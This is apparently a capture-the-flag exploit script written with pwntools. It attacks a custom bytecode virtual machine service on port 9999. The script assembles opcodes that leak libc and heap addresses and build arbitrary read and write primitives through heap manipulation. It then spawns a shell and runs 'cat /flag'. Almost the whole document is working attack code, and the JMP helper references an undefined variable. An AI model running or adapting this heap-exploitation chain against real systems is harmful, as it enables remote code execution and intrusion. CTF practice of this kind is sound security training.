from pwn import *
import sys
context.log_level = "debug"

local=0
aslr=True

p = None

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s):
    print('\033[1;31;40m{s}\033[0m'.format(s=s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))


R = 0
RR = 1
RV = 2
LR = 3
RL = 4

def TERM():
    return b'\x00'

def MOV(MD, V1=b'', V2=b''):
    OPM = 1 | (MD << 5)
    res = OPM.to_bytes(1, "little", signed=False) + V1 + V2
    print(res.hex())
    return res

def PUSH(MD, V1=b''):
    OPM = 2 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def POP(MD, V1=b''):
    OPM = 3 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def ADD(MD, V1=b'', V2=b''):
    OPM = 4 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SUB(MD, V1=b'', V2=b''):
    OPM = 5 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def MUL(MD, V1=b'', V2=b''):
    OPM = 6 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def DIV(MD, V1=b'', V2=b''):
    OPM = 7 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def NOT(MD, V1=b''):
    OPM = 8 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def XOR(MD, V1=b'', V2=b''):
    OPM = 9 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def OR(MD, V1=b'', V2=b''):
    OPM = 10 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SHL(MD, V1=b'', V2=b''):
    OPM = 11 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def SHR(MD, V1=b'', V2=b''):
    OPM = 12 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def TEST(MD, V1=b'', V2=b''):
    OPM = 13 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def JMP(MD, V1=b''):
    OPM = 14 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1 + V2

def JA(MD, V1=b''):
    OPM = 15 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JAE(MD, V1=b''):
    OPM = 16 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JB(MD, V1=b''):
    OPM = 17 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JBE(MD, V1=b''):
    OPM = 18 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JE(MD, V1=b''):
    OPM = 19 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def JNE(MD, V1=b''):
    OPM = 20 | (MD << 5)
    return OPM.to_bytes(1, "little", signed=False) + V1

def ARW(RA, RB, R0, R1):
    EXP = b''
    EXP += MOV(RV, p8(2), p32(0x40330 - 4))
    EXP += MOV(LR, p8(2), p8(RA))

    EXP += MOV(RV, p8(2), p32(0x40330))
    EXP += MOV(LR, p8(2), p8(RB))

    EXP += MOV(RV, p8(2), p32(0x40400))
    EXP += MOV(LR, p8(2), p8(R0))

    EXP += MOV(RV, p8(2), p32(0x40404))
    EXP += MOV(LR, p8(2), p8(R1))

    return EXP

def ARR(RA, RB, R1, R2):
    EXP = b''

    EXP += MOV(RR, p8(1), p8(RA))
    EXP += MOV(RV, p8(2), p32(0x40330 - 4))
    EXP += MOV(LR, p8(2), p8(1))

    EXP += MOV(RR, p8(1), p8(RB))
    EXP += MOV(RV, p8(2), p32(0x40330))
    EXP += MOV(LR, p8(2), p8(1))

    EXP += MOV(RV, p8(2), p32(0x40400))
    EXP += MOV(RL, p8(R1), p8(2))

    EXP += MOV(RV, p8(2), p32(0x40404))
    EXP += MOV(RL, p8(R2), p8(2))

    return EXP


def exp2(ip:str, port:int):
    global p
    try:
        p = remote(ip, port)

        EXP = b''
        
        EXP += MOV(RV, p8(1), p32(0x1234))
        for i in range(0x100, 0x120):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x108, 0x11f):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0x5678))
        for i in range(0x108, 0x108+7):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(2), p32(0x11004))
        EXP += MOV(RL, p8(3), p8(2)) # libc low
        EXP += MOV(RV, p8(2), p32(0x11008))
        EXP += MOV(RL, p8(4), p8(2)) # libc high
    
        EXP += MOV(RV, p8(5), p32(0x1fd120+0x1d1e0)) # libc offset
        EXP += SUB(RR, p8(3), p8(5))
    
        EXP += MOV(RV, p8(2), p32(0x1100c))
        EXP += MOV(RL, p8(6), p8(2)) # heap low
        EXP += MOV(RV, p8(2), p32(0x11010))
        EXP += MOV(RL, p8(7), p8(2)) # heap high
    
        EXP += MOV(RV, p8(8), p32(0x3650+0x220)) # heap offset
        EXP += SUB(RR, p8(6), p8(8))
       
        # Use out all bins
        EXP += MOV(RV, p8(1), p32(0xaaaa))
        for i in range(0x230, 0x238):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        # Prepare Arbitrary Write
        EXP += MOV(RV, p8(1), p32(0xbbbb))
        for i in range(0x300, 0x320):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x300, 0x308 + 7 + 1):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(1), p32(0xcccc))
        EXP += MOV(RV, p8(2), p32(0x43000))
        EXP += MOV(LR, p8(2), p8(1))
    
        EXP += MOV(RV, p8(9), p32(0x262a80 - 4))
        EXP += ADD(RR, p8(3), p8(9))
        EXP += ARR(3, 4, 10, 11)
        EXP += ARR(3, 4, 14, 15)
    
        EXP += MOV(RV, p8(12), p32(0x5040 - 4))
        EXP += ADD(RR, p8(10), p8(12))
    
        EXP += MOV(RV, p8(1), p32(0x211d20-4))
        EXP += SUB(RR, p8(3), p8(1))
    
        EXP += ARW(10, 11, 3, 4)
    
        EXP += MOV(RV, p8(12), p32(0x1270))
        EXP += ADD(RR, p8(14), p8(12))
    
        EXP += MOV(RV, p8(12), p32(0x5040 - 0x5008))
        EXP += SUB(RR, p8(10), p8(12))
    
        EXP += ARW(10, 11, 14, 15)
    
        ru("Address> ")
        sl(str(0x1000))
        ru("Length> ")
        sl(str(len(EXP)))
        ru("Code> ")
        sn(EXP)
        ru("IP> ")
        sl(str(0x1000))
    
        ru("Address> ")
        sn('/bin/sh\x00')
        sl("cat /flag")
        return rl().strip()

    except:
        __import__("traceback").print_exc()
        try:
            p.close()
        except:
            pass
        return None


if __name__ == '__main__':
    exp2(sys.argv[1], 9999)
